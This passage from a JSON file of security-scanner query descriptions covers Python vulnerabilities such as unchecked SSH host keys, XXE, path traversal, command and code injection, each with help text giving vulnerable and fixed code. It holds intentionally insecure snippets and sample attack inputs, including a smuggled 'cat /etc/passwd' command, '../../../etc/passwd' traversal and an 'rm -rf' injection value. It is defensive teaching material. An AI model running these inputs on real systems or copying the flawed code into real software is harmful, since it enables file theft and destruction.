    "id": "py/paramiko-missing-host-key-validation",
    "tags": [
      "security",
      "external/cwe/cwe-295"
    ],
    "filename": "35f1c149-MissingHostKeyValidation",
    "language": "python",
    "help": "# Accepting unknown SSH host keys when using Paramiko\nIn the Secure Shell (SSH) protocol, host keys are used to verify the identity of remote hosts. Accepting unknown host keys may leave the connection open to man-in-the-middle attacks.\n\n\n## Recommendation\nDo not accept unknown host keys. In particular, do not set the default missing host key policy for the Paramiko library to either `AutoAddPolicy` or `WarningPolicy`. Both of these policies continue even when the host key is unknown. The default setting of `RejectPolicy` is secure because it throws an exception when it encounters an unknown host key.\n\n\n## Example\nThe following example shows two ways of opening an SSH connection to `example.com`. The first function sets the missing host key policy to `AutoAddPolicy`. If the host key verification fails, the client will continue to interact with the server, even though the connection may be compromised. The second function sets the host key policy to `RejectPolicy`, and will throw an exception if the host key verification fails.\n\n\n```python\nfrom paramiko.client import SSHClient, AutoAddPolicy, RejectPolicy\n\ndef unsafe_connect():\n    client = SSHClient()\n    client.set_missing_host_key_policy(AutoAddPolicy)\n    client.connect(\"example.com\")\n\n    # ... interaction with server\n\n    client.close()\n\ndef safe_connect():\n    client = SSHClient()\n    client.set_missing_host_key_policy(RejectPolicy)\n    client.connect(\"example.com\")\n\n    # ... interaction with server\n\n    client.close()\n\n```\n\n## References\n* Paramiko documentation: [set_missing_host_key_policy](http://docs.paramiko.org/en/2.4/api/client.html?highlight=set_missing_host_key_policy#paramiko.client.SSHClient.set_missing_host_key_policy).\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n"
  },
  "py/insecure-temporary-file": {
    "name": "Insecure temporary file",
    "description": "Creating a temporary file using this method may be insecure.",
    "kind": "problem",
    "id": "py/insecure-temporary-file",
    "problem.severity": "error",
    "security-severity": 7.0,
    "sub-severity": "high",
    "precision": "high",
    "tags": [
      "external/cwe/cwe-377",
      "security"
    ],
    "filename": "e6224dd6-InsecureTemporaryFile",
    "language": "python",
    "help": "# Insecure temporary file\nFunctions that create temporary file names (such as `tempfile.mktemp` and `os.tempnam`) are fundamentally insecure, as they do not ensure exclusive access to a file with the temporary name they return. The file name returned by these functions is guaranteed to be unique on creation but the file must be opened in a separate operation. There is no guarantee that the creation and open operations will happen atomically. This provides an opportunity for an attacker to interfere with the file before it is opened.\n\nNote that `mktemp` has been deprecated since Python 2.3.\n\n\n## Recommendation\nReplace the use of `mktemp` with some of the more secure functions in the `tempfile` module, such as `TemporaryFile`. If the file is intended to be accessed from other processes, consider using the `NamedTemporaryFile` function.\n\n\n## Example\nThe following piece of code opens a temporary file and writes a set of results to it. Because the file name is created using `mktemp`, another process may access this file before it is opened using `open`.\n\n\n```python\nfrom tempfile import mktemp\n\ndef write_results(results):\n    filename = mktemp()\n    with open(filename, \"w+\") as f:\n        f.write(results)\n    print(\"Results written to\", filename)\n\n```\nBy changing the code to use `NamedTemporaryFile` instead, the file is opened immediately.\n\n\n```python\nfrom tempfile import NamedTemporaryFile\n\ndef write_results(results):\n    with NamedTemporaryFile(mode=\"w+\", delete=False) as f:\n        f.write(results)\n    print(\"Results written to\", f.name)\n\n```\n\n## References\n* Python Standard Library: [tempfile.mktemp](https://docs.python.org/3/library/tempfile.html#tempfile.mktemp).\n* Common Weakness Enumeration: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).\n"
  },
  "py/overly-permissive-file": {
    "name": "Overly permissive file permissions",
    "description": "Allowing files to be readable or writable by users other than the owner may allow sensitive information to be accessed.",
    "kind": "problem",
    "id": "py/overly-permissive-file",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "sub-severity": "high",
    "precision": "medium",
    "tags": [
      "external/cwe/cwe-732",
      "security"
    ],
    "filename": "d4ad48d3-WeakFilePermissions",
    "language": "python",
    "help": "# Overly permissive file permissions\nWhen creating a file, POSIX systems allow permissions to be specified for owner, group and others separately. Permissions should be kept as strict as possible, preventing access to the files contents by other users.\n\n\n## Recommendation\nRestrict the file permissions of files to prevent any but the owner being able to read or write to that file\n\n\n## References\n* Wikipedia: [File system permissions](https://en.wikipedia.org/wiki/File_system_permissions).\n* Common Weakness Enumeration: [CWE-732](https://cwe.mitre.org/data/definitions/732.html).\n"
  },
  "py/overly-large-range": {
    "name": "Overly permissive regular expression range",
    "description": "Overly permissive regular expression ranges match a wider range of characters than intended. This may allow an attacker to bypass a filter or sanitizer.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.0,
    "precision": "high",
    "id": "py/overly-large-range",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "dfdda0ff-OverlyLargeRange",
    "language": "python",
    "help": "# Overly permissive regular expression range\nIt's easy to write a regular expression range that matches a wider range of characters than you intended. For example, `/[a-zA-z]/` matches all lowercase and all uppercase letters, as you would expect, but it also matches the characters: `` [ \\ ] ^ _ ` ``.\n\nAnother common problem is failing to escape the dash character in a regular expression. An unescaped dash is interpreted as part of a range. For example, in the character class `[a-zA-Z0-9%=.,-_]` the last character range matches the 55 characters between `,` and `_` (both included), which overlaps with the range `[0-9]` and is clearly not intended by the writer.\n\n\n## Recommendation\nAvoid any confusion about which characters are included in the range by writing unambiguous regular expressions. Always check that character ranges match only the expected characters.\n\n\n## Example\nThe following example code is intended to check whether a string is a valid 6 digit hex color.\n\n```python\n\nimport re\ndef is_valid_hex_color(color):\n    return re.match(r'^#[0-9a-fA-f]{6}$', color) is not None\n\n```\nHowever, the `A-f` range is overly large and matches every uppercase character. It would parse a \"color\" like `#XXYYZZ` as valid.\n\nThe fix is to use an uppercase `A-F` range instead.\n\n```python\n\nimport re\ndef is_valid_hex_color(color):\n    return re.match(r'^#[0-9a-fA-F]{6}$', color) is not None\n\n```\n\n## References\n* GitHub Advisory Database: [CVE-2021-42740: Improper Neutralization of Special Elements used in a Command in Shell-quote](https://github.com/advisories/GHSA-g4rg-993r-mgx7)\n* wh0.github.io: [Exploiting CVE-2021-42740](https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html)\n* Yosuke Ota: [no-obscure-range](https://ota-meshi.github.io/eslint-plugin-regexp/rules/no-obscure-range.html)\n* Paul Boyd: [The regex \\[,-.\\]](https://pboyd.io/posts/comma-dash-dot/)\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "py/xxe": {
    "name": "XML external entity expansion",
    "description": "Parsing user input as an XML document with external entity expansion is vulnerable to XXE attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "high",
    "id": "py/xxe",
    "tags": [
      "security",
      "external/cwe/cwe-611",
      "external/cwe/cwe-827"
    ],
    "filename": "ae541a7e-Xxe",
    "language": "python",
    "help": "# XML external entity expansion\nParsing untrusted XML files with a weakly configured XML parser may lead to an XML External Entity (XXE) attack. This type of attack uses external entity references to access arbitrary files on a system, carry out denial-of-service (DoS) attacks, or server-side request forgery. Even when the result of parsing is not returned to the user, DoS attacks are still possible and out-of-band data retrieval techniques may allow attackers to steal sensitive data.\n\n\n## Recommendation\nThe easiest way to prevent XXE attacks is to disable external entity handling when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of the XML libraries in the standard library of Python 3, disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action needs to be taken.\n\nWe recommend using the [defusedxml](https://pypi.org/project/defusedxml/) PyPI package, which has been created to prevent XML attacks (both XXE and XML bombs).\n\n\n## Example\nThe following example uses the `lxml` XML parser to parse a string `xml_src`. That string is from an untrusted source, so this code is vulnerable to an XXE attack, since the [ default parser](https://lxml.de/apidoc/lxml.etree.html#lxml.etree.XMLParser) from `lxml.etree` allows local external entities to be resolved.\n\n\n```python\nfrom flask import Flask, request\nimport lxml.etree\n\napp = Flask(__name__)\n\n@app.post(\"/upload\")\ndef upload():\n    xml_src = request.get_data()\n    doc = lxml.etree.fromstring(xml_src)\n    return lxml.etree.tostring(doc)\n\n```\nTo guard against XXE attacks with the `lxml` library, you should create a parser with `resolve_entities` set to `false`. This means that no entity expansion is undertaken, although standard predefined entities such as `&gt;`, for writing `>` inside the text of an XML element, are still allowed.\n\n\n```python\nfrom flask import Flask, request\nimport lxml.etree\n\napp = Flask(__name__)\n\n@app.post(\"/upload\")\ndef upload():\n    xml_src = request.get_data()\n    parser = lxml.etree.XMLParser(resolve_entities=False)\n    doc = lxml.etree.fromstring(xml_src, parser=parser)\n    return lxml.etree.tostring(doc)\n\n```\n\n## References\n* OWASP: [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).\n* Timothy Morgen: [XML Schema, DTD, and Entity Attacks](https://research.nccgroup.com/2014/05/19/xml-schema-dtd-and-entity-attacks-a-compendium-of-known-techniques/).\n* Timur Yunusov, Alexey Osipov: [XML Out-Of-Band Data Retrieval](https://www.slideshare.net/qqlan/bh-ready-v4).\n* Python 3 standard library: [XML Vulnerabilities](https://docs.python.org/3/library/xml.html#xml-vulnerabilities).\n* Python 2 standard library: [XML Vulnerabilities](https://docs.python.org/2/library/xml.html#xml-vulnerabilities).\n* PortSwigger: [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe).\n* Common Weakness Enumeration: [CWE-611](https://cwe.mitre.org/data/definitions/611.html).\n* Common Weakness Enumeration: [CWE-827](https://cwe.mitre.org/data/definitions/827.html).\n"
  },
  "py/cors-bypass": {
    "name": "Cross Origin Resource Sharing(CORS) Policy Bypass",
    "description": "Checking user supplied origin headers using weak comparators like 'string.startswith' may lead to CORS policy bypass.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "id": "py/cors-bypass",
    "tags": [
      "security",
      "externa/cwe/CWE-346"
    ],
    "filename": "2e4a9655-CorsBypass",
    "language": "python",
    "help": "# Cross Origin Resource Sharing(CORS) Policy Bypass\nCross-origin resource sharing policy may be bypassed due to incorrect checks like the `string.startswith` call.\n\n\n## Recommendation\nUse a more stronger check to test for CORS policy bypass.\n\n\n## Example\nMost Python frameworks provide a mechanism for testing origins and performing CORS checks. For example, consider the code snippet below, `origin` is compared using a ` startswith` call against a list of whitelisted origins. This check can be bypassed easily by origin like `domain.com.baddomain.com`\n\n\n```python\nimport cherrypy\n\ndef bad():\n    request = cherrypy.request\n    validCors = \"domain.com\"\n    if request.method in ['POST', 'PUT', 'PATCH', 'DELETE']:\n        origin = request.headers.get('Origin', None)\n        if origin.startswith(validCors):\n            print(\"Origin Valid\")\n```\nThis can be prevented by comparing the origin in a manner shown below.\n\n\n```python\nimport cherrypy\n\ndef good():\n    request = cherrypy.request\n    validOrigin = \"domain.com\"\n    if request.method in ['POST', 'PUT', 'PATCH', 'DELETE']:\n        origin = request.headers.get('Origin', None)\n        if origin == validOrigin:\n            print(\"Origin Valid\")\n```\n\n## References\n* PortsSwigger : [](https://portswigger.net/web-security/cors)Cross-origin resource sharing (CORS)\n* Related CVE: [CVE-2022-3457](https://github.com/advisories/GHSA-824x-jcxf-hpfg).\n"
  },
  "py/timing-attack-against-hash": {
    "name": "Timing attack against Hash",
    "description": "When checking a Hash over a message, a constant-time algorithm should be used. Otherwise, an attacker may be able to forge a valid Hash for an arbitrary message by running a timing attack if they can send to the validation procedure. A successful attack can result in authentication bypass.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "low",
    "id": "py/timing-attack-against-hash",
    "tags": [
      "security",
      "external/cwe/cwe-208"
    ],
    "filename": "a5482fd2-TimingAttackAgainstHash",
    "language": "python",
    "help": "# Timing attack against Hash\nTiming Attack is based on the leakage of information by studying how long it takes the system to respond to different inputs. it can be circumvented by using a constant-time algorithm for checking the value of Hash, more precisely, the comparison time should not depend on the content of the input. Otherwise the attacker gains information that is indirectly leaked by the application. This information may then be used for malicious purposes.\n\n\n## Recommendation\nTwo types of countermeasures can be applied against timing attacks. The first one consists in eliminating timing variations whereas the second renders these variations useless for an attacker. The only absolute way to prevent timing attacks is to make the computation strictly constant time, independent of the input. Use `hmac.compare_digest()` method to securely check the value of Hash. If this method is used, then the calculation time depends only on the length of input byte arrays, and does not depend on the contents of the arrays. Unlike `==` is a fail fast check, If the first byte is not equal, it will return immediately.\n\n\n## Example\nThe following example uses `==` which is a fail fast check for validating a Hash.\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\n\"\"\"\n@Desc   \uff1atiming attack Against Hash\n\"\"\"\nimport hmac\nimport hashlib\n\nkey = \"e179017a-62b0-4996-8a38-e91aa9f1\"\nmsg = \"Test\"\n\ndef sign(pre_key, imsg, alg):\n    return hmac.new(pre_key, imsg, alg).digest()\n\ndef verify(msg, sig):\n    return sig == sign(key, msg, hashlib.sha256) #bad\n\n```\nThe next example use a safe constant-time algorithm for validating a Hash:\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\n\"\"\"\n@Desc   \uff1apreventing timing attack Against Hash\n\"\"\"\nimport hmac\nimport hashlib\n\nkey = \"e179017a-62b0-4996-8a38-e91aa9f1\"\nmsg = \"Test\"\n\ndef sign(pre_key, imsg, alg):\n    return hmac.new(pre_key, imsg, alg).digest()\n\ndef verify(msg, sig):\n    return hmac.compare_digest(sig, sign(key, msg, hashlib.sha256)) #good\n\n```\n\n## References\n* Wikipedia: [Timing attack](https://en.wikipedia.org/wiki/Timing_attack).\n* [hmac.compare_digest() method](https://docs.python.org/3/library/hmac.html#hmac.compare_digest)\n* HMAC: [RFC 2104](https://datatracker.ietf.org/doc/html/rfc2104.html)\n* Common Weakness Enumeration: [CWE-208](https://cwe.mitre.org/data/definitions/208.html).\n"
  },
  "py/insecure-ldap-auth": {
    "name": "Python Insecure LDAP Authentication",
    "description": "Python LDAP Insecure LDAP Authentication",
    "kind": "path-problem",
    "problem.severity": "error",
    "id": "py/insecure-ldap-auth",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-522",
      "external/cwe/cwe-523"
    ],
    "filename": "7c2d8249-LdapInsecureAuth",
    "language": "python",
    "help": "# Python Insecure LDAP Authentication\nFailing to ensure the utilization of SSL in an LDAP connection can cause the entire communication to be sent in cleartext making it easier for an attacker to intercept it.\n\n\n## Recommendation\nAlways set `use_SSL` to `True`, call `start_tls_s()` or set a proper option flag (`ldap.OPT_X_TLS_XXXXXX`).\n\n\n## Example\nThis example shows both good and bad ways to deal with this issue under Python 3.\n\nThe first one sets `use_SSL` to true as a keyword argument whereas the second one fails to provide a value for it, so the default one is used (`False`).\n\n\n```python\nfrom ldap3 import Server, Connection, ALL\nfrom flask import request, Flask\n\napp = Flask(__name__)\n\n\n@app.route(\"/good\")\ndef good():\n    srv = Server(host, port, use_ssl=True)\n    conn = Connection(srv, dn, password)\n    conn.search(dn, search_filter)\n    return conn.response\n\n\n@app.route(\"/bad\")\ndef bad():\n    srv = Server(host, port)\n    conn = Connection(srv, dn, password)\n    conn.search(dn, search_filter)\n    return conn.response\n\n```\n"
  },
  "py/insecure-default-protocol": {
    "name": "Default version of SSL/TLS may be insecure",
    "description": "Leaving the SSL/TLS version unspecified may result in an insecure default protocol being used.",
    "id": "py/insecure-default-protocol",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-327"
    ],
    "filename": "c6fd54e6-InsecureDefaultProtocol",
    "language": "python",
    "help": "# Default version of SSL/TLS may be insecure\nThe `ssl.wrap_socket` function defaults to an insecure version of SSL/TLS when no specific protocol version is specified. This may leave the connection vulnerable to attack.\n\n\n## Recommendation\nEnsure that a modern, strong protocol is used. All versions of SSL, and TLS 1.0 and 1.1 are known to be vulnerable to attacks. Using TLS 1.2 or above is strongly recommended. If no explicit `ssl_version` is specified, the default `PROTOCOL_TLS` is chosen. This protocol is insecure because it allows TLS 1.0 and TLS 1.1 and so should not be used.\n\n\n## Example\nThe following code shows two different ways of setting up a connection using SSL or TLS. They are both potentially insecure because the default version is used.\n\n\n```python\nimport ssl\nimport socket\n\n# Using the deprecated ssl.wrap_socket method\nssl.wrap_socket(socket.socket())\n\n# Using SSLContext\ncontext = ssl.SSLContext()\n\n```\nBoth of the cases above should be updated to use a secure protocol instead, for instance by specifying `ssl_version=PROTOCOL_TLSv1_2` as a keyword argument.\n\nThe latter example can also be made secure by modifying the created context before it is used to create a connection. Therefore it will not be flagged by this query. However, if a connection is created before the context has been secured (for example, by setting the value of `minimum_version`), then the code should be flagged by the query `py/insecure-protocol`.\n\nNote that `ssl.wrap_socket` has been deprecated in Python 3.7. The recommended alternatives are:\n\n* `ssl.SSLContext` - supported in Python 2.7.9, 3.2, and later versions\n* `ssl.create_default_context` - a convenience function, supported in Python 3.4 and later versions.\nEven when you use these alternatives, you should ensure that a safe protocol is used. The following code illustrates how to use flags (available since Python 3.2) or the \\`minimum_version\\` field (favored since Python 3.7) to restrict the protocols accepted when creating a connection.\n\n\n```python\nimport ssl\n\n# Using flags to restrict the protocol\ncontext = ssl.SSLContext()\ncontext.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1\n\n# Declaring a minimum version to restrict the protocol\ncontext = ssl.create_default_context()\ncontext.minimum_version = ssl.TLSVersion.TLSv1_2\n\n```\n\n## References\n* Wikipedia: [ Transport Layer Security](https://en.wikipedia.org/wiki/Transport_Layer_Security).\n* Python 3 documentation: [ class ssl.SSLContext](https://docs.python.org/3/library/ssl.html#ssl.SSLContext).\n* Python 3 documentation: [ ssl.wrap_socket](https://docs.python.org/3/library/ssl.html#ssl.wrap_socket).\n* Python 3 documentation: [ notes on context creation](https://docs.python.org/3/library/ssl.html#functions-constants-and-exceptions).\n* Python 3 documentation: [ notes on security considerations](https://docs.python.org/3/library/ssl.html#ssl-security).\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n"
  },
  "py/pam-auth-bypass": {
    "name": "PAM authorization bypass due to incorrect usage",
    "description": "Not using `pam_acct_mgmt` after `pam_authenticate` to check the validity of a login can lead to authorization bypass.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.1,
    "precision": "high",
    "id": "py/pam-auth-bypass",
    "tags": [
      "security",
      "external/cwe/cwe-285"
    ],
    "filename": "218e5f19-PamAuthorization",
    "language": "python",
    "help": "# PAM authorization bypass due to incorrect usage\nUsing only a call to `pam_authenticate` to check the validity of a login can lead to authorization bypass vulnerabilities.\n\nA `pam_authenticate` only verifies the credentials of a user. It does not check if a user has an appropriate authorization to actually login. This means a user with an expired login or a password can still access the system.\n\n\n## Recommendation\nA call to `pam_authenticate` should be followed by a call to `pam_acct_mgmt` to check if a user is allowed to login.\n\n\n## Example\nIn the following example, the code only checks the credentials of a user. Hence, in this case, a user with expired credentials can still login. This can be verified by creating a new user account, expiring it with ``` chage -E0 `username`  ``` and then trying to log in.\n\n\n```python\nlibpam                    = CDLL(find_library(\"pam\"))\n\npam_authenticate          = libpam.pam_authenticate\npam_authenticate.restype  = c_int\npam_authenticate.argtypes = [PamHandle, c_int]\n\ndef authenticate(username, password, service='login'):\n    def my_conv(n_messages, messages, p_response, app_data):\n        \"\"\"\n        Simple conversation function that responds to any prompt where the echo is off with the supplied password\n        \"\"\"\n        ...\n\n    handle = PamHandle()\n    conv   = PamConv(my_conv, 0)\n    retval = pam_start(service, username, byref(conv), byref(handle))\n\n    retval = pam_authenticate(handle, 0)\n    return retval == 0\n\n```\nThis can be avoided by calling `pam_acct_mgmt` call to verify access as has been done in the snippet shown below.\n\n\n```python\nlibpam                    = CDLL(find_library(\"pam\"))\n\npam_authenticate          = libpam.pam_authenticate\npam_authenticate.restype  = c_int\npam_authenticate.argtypes = [PamHandle, c_int]\n\npam_acct_mgmt          = libpam.pam_acct_mgmt\npam_acct_mgmt.restype  = c_int\npam_acct_mgmt.argtypes = [PamHandle, c_int]\n\ndef authenticate(username, password, service='login'):\n    def my_conv(n_messages, messages, p_response, app_data):\n        \"\"\"\n        Simple conversation function that responds to any prompt where the echo is off with the supplied password\n        \"\"\"\n        ...\n\n    handle = PamHandle()\n    conv   = PamConv(my_conv, 0)\n    retval = pam_start(service, username, byref(conv), byref(handle))\n\n    retval = pam_authenticate(handle, 0)\n    if retval == 0:\n        retval = pam_acct_mgmt(handle, 0)\n    return retval == 0\n\n```\n\n## References\n* Man-Page: [pam_acct_mgmt](https://man7.org/linux/man-pages/man3/pam_acct_mgmt.3.html)\n* Common Weakness Enumeration: [CWE-285](https://cwe.mitre.org/data/definitions/285.html).\n"
  },
  "py/shell-command-constructed-from-input": {
    "name": "Unsafe shell command constructed from library input",
    "description": "Using externally controlled strings in a command line may allow a malicious user to change the meaning of the command.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.3,
    "precision": "medium",
    "id": "py/shell-command-constructed-from-input",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088",
      "external/cwe/cwe-073"
    ],
    "filename": "3ab15ddb-UnsafeShellCommandConstruction",
    "language": "python",
    "help": "# Unsafe shell command constructed from library input\nDynamically constructing a shell command with inputs from library functions may inadvertently change the meaning of the shell command. Clients using the exported function may use inputs containing characters that the shell interprets in a special way, for instance quotes and spaces. This can result in the shell command misbehaving, or even allowing a malicious user to execute arbitrary commands on the system.\n\n\n## Recommendation\nIf possible, provide the dynamic arguments to the shell as an array to APIs such as `subprocess.run` to avoid interpretation by the shell.\n\nAlternatively, if the shell command must be constructed dynamically, then add code to ensure that special characters do not alter the shell command unexpectedly.\n\n\n## Example\nThe following example shows a dynamically constructed shell command that downloads a file from a remote URL.\n\n\n```python\nimport os\n\ndef download(path): \n    os.system(\"wget \" + path) # NOT OK\n\n```\nThe shell command will, however, fail to work as intended if the input contains spaces or other special characters interpreted in a special way by the shell.\n\nEven worse, a client might pass in user-controlled data, not knowing that the input is interpreted as a shell command. This could allow a malicious user to provide the input `http://example.org; cat /etc/passwd` in order to execute the command `cat /etc/passwd`.\n\nTo avoid such potentially catastrophic behaviors, provide the input from library functions as an argument that does not get interpreted by a shell:\n\n\n```python\nimport subprocess\n\ndef download(path): \n    subprocess.run([\"wget\", path]) # OK\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n"
  },
  "py/possible-timing-attack-against-hash": {
    "name": "Timing attack against Hash",
    "description": "When checking a Hash over a message, a constant-time algorithm should be used. Otherwise, an attacker may be able to forge a valid Hash for an arbitrary message by running a timing attack if they can send to the validation procedure. A successful attack can result in authentication bypass.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "low",
    "id": "py/possible-timing-attack-against-hash",
    "tags": [
      "security",
      "external/cwe/cwe-208",
      "experimental"
    ],
    "filename": "a5482fd2-PossibleTimingAttackAgainstHash",
    "language": "python",
    "help": "# Timing attack against Hash\nTiming Attack is based on the leakage of information by studying how long it takes the system to respond to different inputs. it can be circumvented by using a constant-time algorithm for checking the value of Hash, more precisely, the comparison time should not depend on the content of the input. Otherwise the attacker gains information that is indirectly leaked by the application. This information may then be used for malicious purposes.\n\n\n## Recommendation\nTwo types of countermeasures can be applied against timing attacks. The first one consists in eliminating timing variations whereas the second renders these variations useless for an attacker. The only absolute way to prevent timing attacks is to make the computation strictly constant time, independent of the input. Use `hmac.compare_digest()` method to securely check the value of Hash. If this method is used, then the calculation time depends only on the length of input byte arrays, and does not depend on the contents of the arrays. Unlike `==` is a fail fast check, If the first byte is not equal, it will return immediately.\n\n\n## Example\nThe following example uses `==` which is a fail fast check for validating a Hash.\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\n\"\"\"\n@Desc   \uff1atiming attack Against Hash\n\"\"\"\nimport hmac\nimport hashlib\n\nkey = \"e179017a-62b0-4996-8a38-e91aa9f1\"\nmsg = \"Test\"\n\ndef sign(pre_key, imsg, alg):\n    return hmac.new(pre_key, imsg, alg).digest()\n\ndef verify(msg, sig):\n    return sig == sign(key, msg, hashlib.sha256) #bad\n\n```\nThe next example use a safe constant-time algorithm for validating a Hash:\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\n\"\"\"\n@Desc   \uff1apreventing timing attack Against Hash\n\"\"\"\nimport hmac\nimport hashlib\n\nkey = \"e179017a-62b0-4996-8a38-e91aa9f1\"\nmsg = \"Test\"\n\ndef sign(pre_key, imsg, alg):\n    return hmac.new(pre_key, imsg, alg).digest()\n\ndef verify(msg, sig):\n    return hmac.compare_digest(sig, sign(key, msg, hashlib.sha256)) #good\n\n```\n\n## References\n* Wikipedia: [Timing attack](https://en.wikipedia.org/wiki/Timing_attack).\n* [hmac.compare_digest() method](https://docs.python.org/3/library/hmac.html#hmac.compare_digest)\n* HMAC: [RFC 2104](https://datatracker.ietf.org/doc/html/rfc2104.html)\n* Common Weakness Enumeration: [CWE-208](https://cwe.mitre.org/data/definitions/208.html).\n"
  },
  "py/path-injection": {
    "name": "Uncontrolled data used in path expression",
    "description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "sub-severity": "high",
    "precision": "high",
    "id": "py/path-injection",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-022",
      "external/cwe/cwe-023",
      "external/cwe/cwe-036",
      "external/cwe/cwe-073",
      "external/cwe/cwe-099"
    ],
    "filename": "bfd12311-PathInjection",
    "language": "python",
    "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path, either using an off-the-shelf library function like `werkzeug.utils.secure_filename`, or by performing custom validation.\n\nIdeally, follow these rules:\n\n* Do not allow more than a single \".\" character.\n* Do not allow directory separators such as \"/\" or \"\\\\\" (depending on the file system).\n* Do not rely on simply replacing problematic sequences such as \"../\". For example, after applying this filter to \".../...//\", the resulting string would still be \"../\".\n* Use an allowlist of known good patterns.\n\n## Example\nIn the first example, a file name is read from an HTTP request and then used to access a file. However, a malicious user could enter a file name that is an absolute path, such as `\"/etc/passwd\"`.\n\nIn the second example, it appears that the user is restricted to opening a file within the `\"user\"` home directory. However, a malicious user could enter a file name containing special characters. For example, the string `\"../../../etc/passwd\"` will result in the code reading the file located at `\"/server/static/images/../../../etc/passwd\"`, which is the system's password file. This file would then be sent back to the user, giving them access to all the system's passwords. Note that a user could also use an absolute path here, since the result of `os.path.join(\"/server/static/images/\", \"/etc/passwd\")` is `\"/etc/passwd\"`.\n\nIn the third example, the path used to access the file system is normalized *before* being checked against a known prefix. This ensures that regardless of the user input, the resulting path is safe.\n\n\n```python\nimport os.path\nfrom flask import Flask, request, abort\n\napp = Flask(__name__)\n\n@app.route(\"/user_picture1\")\ndef user_picture1():\n    filename = request.args.get('p')\n    # BAD: This could read any file on the file system\n    data = open(filename, 'rb').read()\n    return data\n\n@app.route(\"/user_picture2\")\ndef user_picture2():\n    base_path = '/server/static/images'\n    filename = request.args.get('p')\n    # BAD: This could still read any file on the file system\n    data = open(os.path.join(base_path, filename), 'rb').read()\n    return data\n\n@app.route(\"/user_picture3\")\ndef user_picture3():\n    base_path = '/server/static/images'\n    filename = request.args.get('p')\n    #GOOD -- Verify with normalised version of path\n    fullpath = os.path.normpath(os.path.join(base_path, filename))\n    if not fullpath.startswith(base_path):\n        raise Exception(\"not allowed\")\n    data = open(fullpath, 'rb').read()\n    return data\n\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [werkzeug.utils.secure_filename](http://werkzeug.pocoo.org/docs/utils/#werkzeug.utils.secure_filename).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n"
  },
  "py/code-injection": {
    "name": "Code injection",
    "description": "Interpreting unsanitized user input as code allows a malicious user to perform arbitrary code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "sub-severity": "high",
    "precision": "high",
    "id": "py/code-injection",
    "tags": [
      "security",
      "external/cwe/cwe-094",
      "external/cwe/cwe-095",
      "external/cwe/cwe-116"
    ],
    "filename": "bb54015c-CodeInjection",
    "language": "python",
    "help": "# Code injection\nDirectly evaluating user input (for example, an HTTP request parameter) as code without properly sanitizing the input first allows an attacker arbitrary code execution. This can occur when user input is passed to code that interprets it as an expression to be evaluated, such as `eval` or `exec`.\n\n\n## Recommendation\nAvoid including user input in any expression that may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.\n\n\n## Example\nThe following example shows two functions setting a name from a request. The first function uses `exec` to execute the `setname` function. This is dangerous as it can allow a malicious user to execute arbitrary code on the server. For example, the user could supply the value `\"' + subprocess.call('rm -rf') + '\"` to destroy the server's file system. The second function calls the `setname` function directly and is thus safe.\n\n\n```python\n\nurlpatterns = [\n    # Route to code_execution\n    url(r'^code-ex1$', code_execution_bad, name='code-execution-bad'),\n    url(r'^code-ex2$', code_execution_good, name='code-execution-good')\n]\n\ndef code_execution(request):\n    if request.method == 'POST':\n        first_name = base64.decodestring(request.POST.get('first_name', ''))\n        #BAD -- Allow user to define code to be run.\n        